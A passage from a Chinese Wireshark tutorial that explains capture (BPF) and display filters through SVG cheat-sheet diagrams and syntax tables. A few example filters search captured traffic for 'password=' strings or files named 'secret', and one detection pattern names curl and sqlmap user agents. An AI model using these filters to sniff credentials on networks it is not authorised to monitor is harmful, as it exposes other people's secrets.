stroke="#06b6d4"/>  <text x="381" y="465" font-size="9.2" font-weight="800" fill="#06b6d4" font-family="Microsoft YaHei,Arial">8. 排除自家网关      </text>  <text x="505" y="465" font-size="9" fill="#e2e8f0" font-family="Consolas,Arial">not host 192.168.1.1 and tcp</text>  <rect x="720" y="450" width="335" height="22" rx="5" fill="#0b1530" stroke="#334155"/>  <text x="726" y="465" font-size="9.2" font-weight="800" fill="#334155" font-family="Microsoft YaHei,Arial">9. ARP+ICMP 诊断 </text>  <text x="850" y="465" font-size="9" fill="#e2e8f0" font-family="Consolas,Arial">arp or (icmp and host 1.1.1.1)</text>  <rect x="30" y="476" width="335" height="22" rx="5" fill="#0b1530" stroke="#0ea5e9"/>  <text x="36" y="491" font-size="9.2" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">10. 抓 SYN 握手包  </text>  <text x="160" y="491" font-size="9" fill="#e2e8f0" font-family="Consolas,Arial">tcp[tcpflags] &amp; tcp-syn != 0</text>  <rect x="375" y="476" width="335" height="22" rx="5" fill="#0b1530" stroke="#10b981"/>  <text x="381" y="491" font-size="9.2" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">11. SMB 文件共享   </text>  <text x="505" y="491" font-size="9" fill="#e2e8f0" font-family="Consolas,Arial">tcp port 445 or udp port 137-139</text>  <rect x="720" y="476" width="335" height="22" rx="5" fill="#0b1530" stroke="#8b5cf6"/>  <text x="726" y="491" font-size="9.2" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">12. UDP 大包(&gt;1000)</text>  <text x="850" y="491" font-size="9" fill="#e2e8f0" font-family="Consolas,Arial">udp and greater 1000</text>  <rect x="30" y="502" width="335" height="22" rx="5" fill="#0b1530" stroke="#f59e0b"/>  <text x="36" y="517" font-size="9.2" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">13. VLAN 802.1Q</text>  <text x="160" y="517" font-size="9" fill="#e2e8f0" font-family="Consolas,Arial">vlan 100 and tcp port 80</text>  <rect x="375" y="502" width="335" height="22" rx="5" fill="#0b1530" stroke="#ef4444"/>  <text x="381" y="517" font-size="9.2" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">14. RDP 远程桌面   </text>  <text x="505" y="517" font-size="9" fill="#e2e8f0" font-family="Consolas,Arial">tcp port 3389</text>  <rect x="720" y="502" width="335" height="22" rx="5" fill="#0b1530" stroke="#ec4899"/>  <text x="726" y="517" font-size="9.2" font-weight="800" fill="#ec4899" font-family="Microsoft YaHei,Arial">15. HTTP GET 包 </text>  <text x="850" y="517" font-size="9" fill="#e2e8f0" font-family="Consolas,Arial">tcp port 80 and tcp[((tcp[12:1] &amp; 0xf0) </text>  <rect x="30" y="528" width="335" height="22" rx="5" fill="#0b1530" stroke="#a855f7"/>  <text x="36" y="543" font-size="9.2" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">16. MAC 地址指定   </text>  <text x="160" y="543" font-size="9" fill="#e2e8f0" font-family="Consolas,Arial">ether host 00:11:22:33:44:55</text>  <rect x="375" y="528" width="335" height="22" rx="5" fill="#0b1530" stroke="#06b6d4"/>  <text x="381" y="543" font-size="9.2" font-weight="800" fill="#06b6d4" font-family="Microsoft YaHei,Arial">17. FTP 主动+被动  </text>  <text x="505" y="543" font-size="9" fill="#e2e8f0" font-family="Consolas,Arial">tcp port 21 or tcp port 20 or tcp portra</text>  <rect x="720" y="528" width="335" height="22" rx="5" fill="#0b1530" stroke="#334155"/>  <text x="726" y="543" font-size="9.2" font-weight="800" fill="#334155" font-family="Microsoft YaHei,Arial">18. HTTP 非 443 </text>  <text x="850" y="543" font-size="9" fill="#e2e8f0" font-family="Consolas,Arial">(tcp port 80 or tcp port 8080 or tcp por</text>
</svg>
```


### 什么是捕获过滤器？

捕获过滤器决定哪些数据包会被捕获。它像一道"门"，只有符合条件的数据包才能进入。

**对比：**
- 捕获过滤器：决定**是否捕获**
- 显示过滤器：决定**是否显示**

### 设置捕获过滤器

**步骤1：打开捕获选项**

点击"Capture" → "Options"，或在接口列表中点击接口旁的设置图标。

**步骤2：输入过滤器**

在"Capture Filter"栏输入过滤表达式。

### 常用捕获过滤器

| 过滤器 | 说明 |
|------|------|
| host 192.168.1.1 | 只捕获与192.168.1.1相关的包 |
| net 192.168.1.0/24 | 只捕获192.168.1.x网段的包 |
| port 80 | 只捕获80端口（HTTP）的包 |
| port 443 | 只捕获443端口（HTTPS）的包 |
| port 22 | 只捕获22端口（SSH）的包 |
| tcp | 只捕获TCP包 |
| udp | 只捕获UDP包 |
| icmp | 只捕获ICMP包（ping） |
| arp | 只捕获ARP包 |
| not port 22 | 不捕获SSH流量 |
| host 192.168.1.1 and port 80 | 只捕获192.168.1.1的HTTP流量 |

### 捕获过滤器语法

**主机过滤：**
```
host 192.168.1.1        # 特定主机
host www.example.com    # 特定域名
src host 192.168.1.1    # 源主机
dst host 192.168.1.1    # 目标主机
```

**网络过滤：**
```
net 192.168.1.0/24      # CIDR格式
net 192.168.1.0 mask 255.255.255.0  # 子网掩码格式
```

**端口过滤：**
```
port 80                 # 特定端口
portrange 1-100         # 端口范围
src port 80             # 源端口
dst port 80             # 目标端口
```

**协议过滤：**
```
tcp                     # TCP协议
udp                     # UDP协议
icmp                    # ICMP协议
arp                     # ARP协议
ip                      # IP协议
```

**组合过滤：**
```
and                     # 与（同时满足）
or                      # 或（满足任一）
not                     # 非（不满足）
```

---

## 5.8 显示过滤器详解

```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 590" width="1080" height="590" style="max-width:100%;background:linear-gradient(180deg,#020617 0%,#0f172a 100%);border-radius:14px;border:1px solid #1e293b">
  <defs>
    <linearGradient id="g1s08" x1="0" x2="1" y1="0" y2="0"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="g2s08" x1="0" x2="0" y1="0" y2="1"><stop offset="0" stop-color="#1e293b"/><stop offset="1" stop-color="#020617"/></linearGradient>
    <marker id="arrs08" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M 0 0 L 10 5 L 0 10 z" fill="#60a5fa"/></marker>
    <filter id="shs08"><feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#000" flood-opacity="0.55"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="64" fill="url(#g1s08)" opacity="0.3"/>
  <rect x="0" y="0" width="1080" height="2" fill="url(#g1s08)"/>
  <rect x="0" y="60" width="1080" height="2" fill="#1e293b"/>  <text x="540" y="36" text-anchor="middle" font-size="20" font-weight="800" fill="#f1f5f9" font-family="Microsoft YaHei,Arial" filter="url(#shs08)">图 5-8 显示过滤器 10 大常用语法：20 条例句（Ctrl+/ 直接在过滤器框写）</text>  <text x="540" y="56" text-anchor="middle" font-size="12" fill="#94a3b8" font-family="Microsoft YaHei,Arial">显示过滤器=已抓包后二次过滤；比 BPF 强 10 倍=任意协议任意字段+正则+contains/matches/函数</text>  <rect x="30" y="100" width="505" height="80" rx="12" fill="#0b1530" stroke="#0ea5e9" filter="url(#sh)"/>  <rect x="30" y="100" width="505" height="30" rx="12" fill="#0ea5e9" opacity="0.18"/>  <rect x="30" y="100" width="505" height="30" rx="12" fill="none" stroke="#0ea5e9"/>  <text x="44" y="120" font-size="12" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">① IP/端口 过滤</text>  <text x="44" y="148" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">ip.addr == 192.168.1.1</text>  <text x="44" y="163" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">tcp.port == 443 || udp.port == 53</text>  <text x="44" y="178" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">!(ip.addr == 10.0.0.0/8) 排除</text>  <rect x="545" y="100" width="505" height="80" rx="12" fill="#0b1530" stroke="#10b981" filter="url(#sh)"/>  <rect x="545" y="100" width="505" height="30" rx="12" fill="#10b981" opacity="0.18"/>  <rect x="545" y="100" width="505" height="30" rx="12" fill="none" stroke="#10b981"/>  <text x="559" y="120" font-size="12" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">② 协议过滤</text>  <text x="559" y="148" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">http / tls / dns / arp / icmp</text>  <text x="559" y="163" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">http2 / quic / smb2 / rdp / ssh</text>  <text x="559" y="178" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">tcp.flags.reset == 1 只看 RST 包</text>  <rect x="30" y="188" width="505" height="80" rx="12" fill="#0b1530" stroke="#8b5cf6" filter="url(#sh)"/>  <rect x="30" y="188" width="505" height="30" rx="12" fill="#8b5cf6" opacity="0.18"/>  <rect x="30" y="188" width="505" height="30" rx="12" fill="none" stroke="#8b5cf6"/>  <text x="44" y="208" font-size="12" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">③ 字符串 contains</text>  <text x="44" y="236" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">http.request.uri contains &quot;login&quot;</text>  <text x="44" y="251" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">frame contains &quot;password=&quot;</text>  <text x="44" y="266" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">tls.handshake.extensions_server_name contains &quot;baidu&quot;</text>  <rect x="545" y="188" width="505" height="80" rx="12" fill="#0b1530" stroke="#a855f7" filter="url(#sh)"/>  <rect x="545" y="188" width="505" height="30" rx="12" fill="#a855f7" opacity="0.18"/>  <rect x="545" y="188" width="505" height="30" rx="12" fill="none" stroke="#a855f7"/>  <text x="559" y="208" font-size="12" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">④ 正则 matches</text>  <text x="559" y="236" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">http.user_agent matches &quot;(bot|curl|sqlmap)&quot;</text>  <text x="559" y="251" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">dns.qry.name matches &quot;^[a-z]{5,10}\.com$&quot;</text>  <rect x="30" y="276" width="505" height="80" rx="12" fill="#0b1530" stroke="#ec4899" filter="url(#sh)"/>  <rect x="30" y="276" width="505" height="30" rx="12" fill="#ec4899" opacity="0.18"/>  <rect x="30" y="276" width="505" height="30" rx="12" fill="none" stroke="#ec4899"/>  <text x="44" y="296" font-size="12" font-weight="800" fill="#ec4899" font-family="Microsoft YaHei,Arial">⑤ HTTP 方法/状态码</text>  <text x="44" y="324" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">http.request.method == GET</text>  <text x="44" y="339" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">http.response.code == 200</text>  <text x="44" y="354" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">http.host == &quot;api.example.com&quot;</text>  <rect x="545" y="276" width="505" height="80" rx="12" fill="#0b1530" stroke="#ef4444" filter="url(#sh)"/>  <rect x="545" y="276" width="505" height="30" rx="12" fill="#ef4444" opacity="0.18"/>  <rect x="545" y="276" width="505" height="30" rx="12" fill="none" stroke="#ef4444"/>  <text x="559" y="296" font-size="12" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">⑥ 标志位 TCP Flags</text>  <text x="559" y="324" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">tcp.flags.syn==1 &amp;&amp; tcp.flags.ack==0  SYN 包</text>  <text x="559" y="339" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">tcp.flags.fin==1  挥手包</text>  <text x="559" y="354" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">tcp.analysis.retransmission 重传包</text>  <rect x="30" y="364" width="505" height="80" rx="12" fill="#0b1530" stroke="#f59e0b" filter="url(#sh)"/>  <rect x="30" y="364" width="505" height="30" rx="12" fill="#f59e0b" opacity="0.18"/>  <rect x="30" y="364" width="505" height="30" rx="12" fill="none" stroke="#f59e0b"/>  <text x="44" y="384" font-size="12" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">⑦ DNS 查询/响应</text>  <text x="44" y="412" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">dns.flags.response == 0 查询</text>  <text x="44" y="427" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">dns.flags.response == 1 响应</text>  <text x="44" y="442" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">dns.qry.name == &quot;www.baidu.com&quot;</text>  <rect x="545" y="364" width="505" height="80" rx="12" fill="#0b1530" stroke="#06b6d4" filter="url(#sh)"/>  <rect x="545" y="364" width="505" height="30" rx="12" fill="#06b6d4" opacity="0.18"/>  <rect x="545" y="364" width="505" height="30" rx="12" fill="none" stroke="#06b6d4"/>  <text x="559" y="384" font-size="12" font-weight="800" fill="#06b6d4" font-family="Microsoft YaHei,Arial">⑧ TLS SNI/版本</text>  <text x="559" y="412" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">tls.handshake.type == 1 Client Hello</text>  <text x="559" y="427" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">tls.record.version == 0x0304  TLS 1.3</text>  <text x="559" y="442" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">tls.handshake.extension.type == 0  SNI</text>  <rect x="30" y="452" width="505" height="80" rx="12" fill="#0b1530" stroke="#6366f1" filter="url(#sh)"/>  <rect x="30" y="452" width="505" height="30" rx="12" fill="#6366f1" opacity="0.18"/>  <rect x="30" y="452" width="505" height="30" rx="12" fill="none" stroke="#6366f1"/>  <text x="44" y="472" font-size="12" font-weight="800" fill="#6366f1" font-family="Microsoft YaHei,Arial">⑨ SMB/RDP/SSH</text>  <text x="44" y="500" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">smb2.filename contains &quot;secret&quot;</text>  <text x="44" y="515" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">ntlmssp.auth.domain == &quot;DOMAIN&quot;</text>  <text x="44" y="530" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">ssh.protocol == &quot;SSH-2.0-OpenSSH&quot;</text>  <rect x="545" y="452" width="505" height="80" rx="12" fill="#0b1530" stroke="#dc2626" filter="url(#sh)"/>  <rect x="545" y="452" width="505" height="30" rx="12" fill="#dc2626" opacity="0.18"/>  <rect x="545" y="452" width="505" height="30" rx="12" fill="none" stroke="#dc2626"/>  <text x="559" y="472" font-size="12" font-weight="800" fill="#dc2626" font-family="Microsoft YaHei,Arial">⑩ 字段切片/函数</text>  <text x="559" y="500" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">frame.len &gt;= 1400</text>  <text x="559" y="515" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">ip.ttl &lt; 10 (tracepath 场景)</text>  <text x="559" y="530" font-size="10.2" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">tcp.stream eq 5 第 5 条 TCP 流</text>  <rect x="30" y="548" width="1020" height="30" rx="8" fill="#020617" stroke="#6366f1"/>  <text x="540" y="568" text-anchor="middle" font-size="11" fill="#bfdbfe" font-family="Consolas,Microsoft YaHei,Arial">== 等于    != 不等于    &amp;&amp; / and 与    || / or 或    ! / not 非    gt/lt/ge/le 大于/小于/≥/≤    in {80 443 3306} 集合    frame matches/regex 正则</text>
</svg>
```
```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 650" width="1080" height="650" style="max-width:100%;background:linear-gradient(180deg,#020617 0%,#0f172a 100%);border-radius:14px;border:1px solid #1e293b">
  <defs>
    <linearGradient id="g1s09" x1="0" x2="1" y1="0" y2="0"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="g2s09" x1="0" x2="0" y1="0" y2="1"><stop offset="0" stop-color="#1e293b"/><stop offset="1" stop-color="#020617"/></linearGradient>
    <marker id="arrs09" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M 0 0 L 10 5 L 0 10 z" fill="#60a5fa"/></marker>
    <filter id="shs09"><feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#000" flood-opacity="0.55"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="64" fill="url(#g1s09)" opacity="0.3"/>
  <rect x="0" y="0" width="1080" height="2" fill="url(#g1s09)"/>
  <rect x="0" y="60" width="1080" height="2" fill="#1e293b"/>  <text x="540" y="36" text-anchor="middle" font-size="20" font-weight="800" fill="#f1f5f9" font-family="Microsoft YaHei,Arial" filter="url(#shs09)">图 5-9 捕获过滤器（BPF） vs 显示过滤器 黄金对比表（一张表彻底不混）</text>  <text x="540" y="56" text-anchor="middle" font-size="12" fill="#94a3b8" font-family="Microsoft YaHei,Arial">新手 90% 都搞混=记住口诀：大流量场景 BPF 先瘦身 → 小文件用显示过滤器精准分析</text>  <rect x="30" y="100" width="160" height="36" fill="#1e293b" stroke="#6366f1"/>  <text x="110.0" y="123" text-anchor="middle" font-size="12" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">对比维度</text>  <rect x="200" y="100" width="430" height="36" fill="#1e293b" stroke="#6366f1"/>  <text x="415.0" y="123" text-anchor="middle" font-size="12" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">捕获过滤器 Capture Filter (BPF)</text>  <rect x="640" y="100" width="410" height="36" fill="#1e293b" stroke="#6366f1"/>  <text x="845.0" y="123" text-anchor="middle" font-size="12" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">显示过滤器 Display Filter</text>  <rect x="30" y="136" width="160" height="50" fill="#111c35" stroke="#334155"/>  <rect x="200" y="136" width="430" height="50" fill="#111c35" stroke="#334155"/>  <rect x="640" y="136" width="410" height="50" fill="#111c35" stroke="#334155"/>  <text x="110" y="165.0" text-anchor="middle" font-size="10" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">执行时机</text>  <text x="208" y="158" font-size="9.2" fill="#0ea5e9" font-family="Consolas,Microsoft YaHei,Arial">抓包前（网卡驱动层，先过滤后写磁盘）</text>  <text x="648" y="158" font-size="9.2" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">抓包后（内存中过滤，不影响原始 pcap）</text>  <rect x="30" y="186" width="160" height="50" fill="#0b1530" stroke="#334155"/>  <rect x="200" y="186" width="430" height="50" fill="#0b1530" stroke="#334155"/>  <rect x="640" y="186" width="410" height="50" fill="#0b1530" stroke="#334155"/>  <text x="110" y="215.0" text-anchor="middle" font-size="10" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">语法体系</text>  <text x="208" y="208" font-size="9.2" fill="#0ea5e9" font-family="Consolas,Microsoft YaHei,Arial">BPF 语法（tcpdump 同款，C 风格字节位运算）</text>  <text x="648" y="208" font-size="9.2" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">Wireshark 自家语法（协议字段名.子字段.子字段）</text>  <rect x="30" y="236" width="160" height="50" fill="#111c35" stroke="#334155"/>  <rect x="200" y="236" width="430" height="50" fill="#111c35" stroke="#334155"/>  <rect x="640" y="236" width="410" height="50" fill="#111c35" stroke="#334155"/>  <text x="110" y="265.0" text-anchor="middle" font-size="10" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">性能</text>  <text x="208" y="258" font-size="9.2" fill="#0ea5e9" font-family="Consolas,Microsoft YaHei,Arial">极高=抓 10Gbps 流量不丢包</text>  <text x="648" y="258" font-size="9.2" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">中=对已抓包遍历=大 pcap 可能慢</text>  <rect x="30" y="286" width="160" height="50" fill="#0b1530" stroke="#334155"/>  <rect x="200" y="286" width="430" height="50" fill="#0b1530" stroke="#334155"/>  <rect x="640" y="286" width="410" height="50" fill="#0b1530" stroke="#334155"/>  <text x="110" y="315.0" text-anchor="middle" font-size="10" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">位置</text>  <text x="208" y="308" font-size="9.2" fill="#0ea5e9" font-family="Consolas,Microsoft YaHei,Arial">主界面 Capture Options 下拉框 / 抓前填</text>  <text x="648" y="308" font-size="9.2" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">主界面最显眼的那行 绿色输入框</text>  <rect x="30" y="336" width="160" height="50" fill="#111c35" stroke="#334155"/>  <rect x="200" y="336" width="430" height="50" fill="#111c35" stroke="#334155"/>  <rect x="640" y="336" width="410" height="50" fill="#111c35" stroke="#334155"/>  <text x="110" y="365.0" text-anchor="middle" font-size="10" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">颜色规则</text>  <text x="208" y="358" font-size="9.2" fill="#0ea5e9" font-family="Consolas,Microsoft YaHei,Arial">绿色=有效语法  红色=错误</text>  <text x="648" y="358" font-size="9.2" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">绿色=有效语法  红色=错误  黄色=Deprecated</text>  <rect x="30" y="386" width="160" height="50" fill="#0b1530" stroke="#334155"/>  <rect x="200" y="386" width="430" height="50" fill="#0b1530" stroke="#334155"/>  <rect x="640" y="386" width="410" height="50" fill="#0b1530" stroke="#334155"/>  <text x="110" y="415.0" text-anchor="middle" font-size="10" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">协议字段访问</text>  <text x="208" y="408" font-size="9.2" fill="#0ea5e9" font-family="Consolas,Microsoft YaHei,Arial">ether[offset] / tcp[offset] 原始字节偏移</text>  <text x="648" y="408" font-size="9.2" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">http.host / tls.sni 任意协议任意命名字段</text>  <rect x="30" y="436" width="160" height="50" fill="#111c35" stroke="#334155"/>  <rect x="200" y="436" width="430" height="50" fill="#111c35" stroke="#334155"/>  <rect x="640" y="436" width="410" height="50" fill="#111c35" stroke="#334155"/>  <text x="110" y="465.0" text-anchor="middle" font-size="10" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">正则/contains</text>  <text x="208" y="458" font-size="9.2" fill="#0ea5e9" font-family="Consolas,Microsoft YaHei,Arial">❌ 不支持（只能算字节掩码，如 tcp[0:4]=0x47455420）</text>  <text x="648" y="458" font-size="9.2" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">✅ 强大支持：contains / matches / in / 函数</text>  <rect x="30" y="486" width="160" height="50" fill="#0b1530" stroke="#334155"/>  <rect x="200" y="486" width="430" height="50" fill="#0b1530" stroke="#334155"/>  <rect x="640" y="486" width="410" height="50" fill="#0b1530" stroke="#334155"/>  <text x="110" y="515.0" text-anchor="middle" font-size="10" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">典型应用场景</text>  <text x="208" y="508" font-size="9.2" fill="#0ea5e9" font-family="Consolas,Microsoft YaHei,Arial">高带宽生产环境抓包/护网 10Gbps 出口</text>  <text x="648" y="508" font-size="9.2" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">CTF/Misc/故障排查/安全分析/日常</text>  <rect x="30" y="536" width="160" height="50" fill="#111c35" stroke="#334155"/>  <rect x="200" y="536" width="430" height="50" fill="#111c35" stroke="#334155"/>  <rect x="640" y="536" width="410" height="50" fill="#111c35" stroke="#334155"/>  <text x="110" y="565.0" text-anchor="middle" font-size="10" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">过滤示例</text>  <text x="208" y="558" font-size="9.2" fill="#0ea5e9" font-family="Consolas,Microsoft YaHei,Arial">host 192.168.1.1 and tcp port 80</text>  <text x="648" y="558" font-size="9.2" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial">ip.addr == 192.168.1.1 &amp;&amp; tcp.port == 80</text>  <rect x="30" y="586" width="160" height="50" fill="#0b1530" stroke="#334155"/>  <rect x="200" y="586" width="430" height="50" fill="#0b1530" stroke="#334155"/>  <rect x="640" y="586" width="410" height="50" fill="#0b1530" stroke="#334155"/>  <text x="110" y="615.0" text-anchor="middle" font-size="10" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">配合使用（最佳实践）</text>  <text x="208" y="608" font-size="9.2" fill="#0ea5e9" font-family="Consolas,Microsoft YaHei,Arial">先用 host 10.0.0.5 and tcp port 443 → 抓完后再用 tls.handshake</text>  <text x="648" y="608" font-size="9.2" fill="#10b981" font-family="Consolas,Microsoft YaHei,Arial"></text>
</svg>
```



### 什么是显示过滤器？

显示过滤器从已捕获的数据包中筛选显示。它像"筛选器"，帮你找到想要的包。

### 设置显示过滤器

在过滤栏输入表达式，点击"Apply"应用。

### 常用显示过滤器

**协议过滤：**
| 过滤器 | 说明 |
|------|------|
| http | HTTP协议 |
| https | HTTPS协议（实际显示为tls） |
| tcp | TCP协议 |
| udp | UDP协议 |
| icmp | ICMP协议 |
| dns | DNS协议 |
| ftp | FTP协议 |
| ssh | SSH协议 |
| arp | ARP协议 |

**地址过滤：**
| 过滤器 | 说明 |
|------|------|
| ip.addr == 192.168.1.1 | 与192.168.1.1相关的包 |
| ip.src == 192.168.1.1 | 来自192.168.1.1的包 |
| ip.dst == 192.168.1.1 | 发往192.168.1.1的包 |
| eth.addr == 00:11:22:33:44:55 | MAC地址过滤 |

**端口过滤：**
| 过滤器 | 说明 |
|------|------|
| tcp.port == 80 | TCP80端口 |
| tcp.srcport == 80 | TCP源端口80 |
| tcp.dstport == 80 | TCP目标端口80 |
| udp.port == 53 | UDP53端口（DNS） |

**HTTP过滤：**
| 过滤器 | 说明 |
|------|------|
| http.request.method == "GET" | GET请求 |
| http.request.method == "POST" | POST请求 |
| http.request.uri contains "login" | URL包含login |
| http.response.code == 200 | 200响应 |
| http.response.code == 404 | 404响应 |

**TCP过滤：**
| 过滤器 | 说明 |
|------|------|
| tcp.flags.syn == 1 | SYN标志（连接请求） |
| tcp.flags.ack == 1 | ACK标志（确认） |
| tcp.flags.fin == 1 | FIN标志（关闭连接） |
| tcp.flags.reset == 1 | RST标志（重置） |

**组合过滤：**
| 过滤器 | 说明 |
|------|------|
| http and ip.addr == 192.168.1.1 | HTTP且地址匹配 |
| tcp.port == 80 or tcp.port == 443 | 80或443端口 |
| http.request.method == "POST" and http.request.uri contains "login" | POST登录请求 |
| !(arp or icmp) | 不是ARP或ICMP |

### 显示过滤器语法详解

**比较运算符：**
| 运算符 | 说明 | 示例 |
|------|------|------|
| == | 等于 | ip.addr == 192.168.1.1 |
| != | 不等于 | ip.addr != 192.168.1.1 |
| > | 大于 | tcp.port > 1024 |
| < | 小于 | tcp.port < 1024 |
| >= | 大于等于 | frame.len >= 100 |
| <= | 小于等于 | frame.len <= 100 |

**逻辑运算符：**
| 运算符 | 说明 | 示例 |
|------|------|------|
| and | 与 | http and tcp |
| or | 或 | http or ftp |
| not | 非 | not icmp |
| ! | 非（简化） | !icmp |

**字符串匹配：**
| 运算符 | 说明 | 示例 |
|------|------|------|
| contains | 包含 | http.request.uri contains "admin" |
| matches | 正则匹配 | http.host matches "example" |
| !contains | 不包含 | http.request.uri !contains "login" |

---

## 5.9 协议分析与流量追踪详解

```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 540" width="1080" height="540" style="max-width:100%;background:linear-gradient(180deg,#020617 0%,#0f172a 100%);border-radius:14px;border:1px solid #1e293b">
  <defs>
    <linearGradient id="g1s10" x1="0" x2="1" y1="0" y2="0"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#06b6d4"/></linearGradient>
    <linearGradient id="g2s10" x1="0" x2="0" y1="0" y2="1"><stop offset="0" stop-color="#1e293b"/><stop offset="1" stop-color="#020617"/></linearGradient>
    <marker id="arrs10" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M 0 0 L 10 5 L 0 10 z" fill="#60a5fa"/></marker>
    <filter id="shs10"><feDropShadow dx="0" dy="2" stdDeviation="3" flood-color="#000" flood-opacity="0.55"/></filter>
  </defs>
  <rect x="0" y="0" width="1080" height="64" fill="url(#g1s10)" opacity="0.3"/>
  <rect x="0" y="0" width="1080" height="2" fill="url(#g1s10)"/>
  <rect x="0" y="60" width="1080" height="2" fill="#1e293b"/>  <text x="540" y="36" text-anchor="middle" font-size="20" font-weight="800" fill="#f1f5f9" font-family="Microsoft YaHei,Arial" filter="url(#shs10)">图 5-10 6 大核心协议报文结构（OSI 2-7 层=一眼看全协议栈封装）</text>  <text x="540" y="56" text-anchor="middle" font-size="12" fill="#94a3b8" font-family="Microsoft YaHei,Arial">每个报文封装规律：Ethernet 头(14B) + IP 头(20B) + TCP/UDP 头(20/8B) + Payload → 从上到下是层层封装</text>  <rect x="30" y="100" width="500" height="390" rx="14" fill="#0b1530" stroke="#334155"/>  <text x="280" y="125" text-anchor="middle" font-size="13.5" font-weight="800" fill="#e2e8f0" font-family="Microsoft YaHei,Arial">① 协议栈层层封装（自上而下，外层包裹内层）</text>  <rect x="50" y="140" width="460" height="40" rx="8" fill="#0f172a" stroke="#a855f7"/>  <rect x="50" y="140" width="120" height="40" rx="8" fill="#a855f7" opacity="0.22"/>  <text x="110" y="165" text-anchor="middle" font-size="10.5" font-weight="800" fill="#a855f7" 